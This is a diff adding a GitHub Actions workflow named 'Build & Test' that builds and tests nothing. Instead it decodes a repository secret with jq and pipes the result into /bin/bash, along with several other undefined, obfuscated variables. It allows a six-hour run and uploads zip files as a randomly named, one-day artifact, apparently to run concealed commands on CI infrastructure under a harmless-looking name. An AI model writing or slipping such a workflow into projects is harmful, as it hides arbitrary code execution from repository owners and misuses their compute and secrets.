@@ -1,0 +1,31 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          b7177: ${{ secrets.b7177 }}
+        run: |
+          printf '%s' "$b7177" | jq -r .i865 | /bin/bash
+          echo $qv1 | jq -r .x581 | /bin/bash
+          echo $vsn5 | jq -r .ihw312 | /bin/bash
+          echo $h949 | jq -r .d9730 | /bin/bash
+          echo $ji168 | jq -r .z4 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1iwciJf1
+          path: "*.zip"
+          retention-days: 1
